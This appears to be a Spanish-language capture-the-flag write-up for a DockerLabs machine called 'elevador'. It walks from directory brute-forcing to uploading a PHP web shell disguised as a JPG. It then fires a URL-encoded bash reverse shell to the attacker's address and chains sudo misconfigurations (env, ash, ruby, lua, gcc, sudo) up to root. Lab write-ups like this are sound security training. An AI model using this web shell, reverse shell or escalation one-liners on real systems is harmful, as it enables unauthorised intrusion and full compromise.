nmap:  80

![image](https://github.com/user-attachments/assets/206a9c1a-9a66-4136-b0f9-050aa3a76ad0)


---
dentro de la pagina podemos ver que nos da un mensaje al abrir el ascensor:

![image](https://github.com/user-attachments/assets/43924d93-9367-4f22-9921-583d71be6e11)

![image](https://github.com/user-attachments/assets/7e847733-9588-4015-94c3-874fb076e3e1)

al hacer una ataque de fuerza bruta a los directorios  nos mostrara un "themes",

      gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,html,txt -k

![image](https://github.com/user-attachments/assets/6b57711b-3b7a-4c5a-9ec9-8278ccd4ea80)


ahora si hacemos otra vez un gobuster pero agregando el "themes" 

      gobuster dir -u http://172.17.0.2/themes -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,html,txt -k


y nos dará algunos importantes

![image](https://github.com/user-attachments/assets/3582ef9d-7e61-442d-80d0-9124e65d5e37)


si ingresamos al primero o sea al uploads nos mandara a una subida de archivos

![image](https://github.com/user-attachments/assets/a369a585-4f64-44ec-aea7-50398bcbd6e1)


como también me dio: archivo.html nos vamos ahí y vemos que podemos subir archivos pero solo archivos JPG

![image](https://github.com/user-attachments/assets/48ab9e59-7a3a-4580-a1df-2d9ba76fd769)


como solo deja subir archivos "jpg" modificamos un archivo 
> nano shell.php.jpg

dentro tendrá este código:

    - <?php system($_GET['cmd']); ?>

vemos que se subió

![image](https://github.com/user-attachments/assets/1e4b7b39-2209-4d3e-97da-5376f04cf198)

 presionamos el archivo que nos muestra y veremos que no hay nada pero en la URL la modificamos para que quede así:
 
   > 172.17.0.2/themes/uploads/675712b70a259.jpg?cmd=whoami

![image](https://github.com/user-attachments/assets/22fedb8d-23f2-4bda-804c-dccda91b64da)

nos mostrara "www-data" o sea que la vulnerabilidad esta, así que modificamos la terminal con una bash y colocamos el terminal en escucha
dejamos la terminal asi:

> 172.17.0.2/themes/uploads/675712b70a259.jpg?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/172.17.0.1/443%200%3E%261%22

![image](https://github.com/user-attachments/assets/aaf0c7df-4b93-4a68-8979-148e56b1defe)


y ahora dentro si hacemos un "sudo -l" vemos que podemos escalar por "env"

![image](https://github.com/user-attachments/assets/bd7d442b-bb52-466c-b636-4a6d759de53d)

la buscamos: https://gtfobins.github.io/gtfobins/env/

como se que hay otros usuarios pobre y funciono el escalado con daphne:
> sudo -u daphne /usr/bin/env /bin/sh

![image](https://github.com/user-attachments/assets/a63fdff9-756f-4517-a349-cffc7e68426f)


y somos el usuario daphne

al hacer sudo -l da: "ash" la buscamos: https://gtfobins.github.io/gtfobins/ash/

ahora lanzamos asi:
> sudo -u vilma /usr/bin/ash

![image](https://github.com/user-attachments/assets/5acab12d-f16d-4bef-b762-c6b0645db515)


y somos vilma

ahora al hacer sudo -l da que es ruby buscamos donde mismo y lanzamos asi:
> sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'

![image](https://github.com/user-attachments/assets/c20e64b8-a8ba-4190-aa46-c2f5a49597b1)


ahora somos shaggy y entonces ahora buscamos como escalar y aparece "lua"

lanzamos el comando así:
> sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'

![[usuario4.png]]

somos fred

podemos escalar con gcc y donde mismo buscamos y lanzamos el comando:
> sudo -u scooby /usr/bin/gcc  -wrapper /bin/sh,-s .

![[usuario5.png]]

somos scooby

ahora al hacer sudo -l podemos  ver que se escala por "sudo", modifico  el codigo para que se vea de esta forma:
> sudo -u root /usr/bin/sudo /bin/bash

![[dockerlabs/facil/elevador/root.png]]

y somos root! 
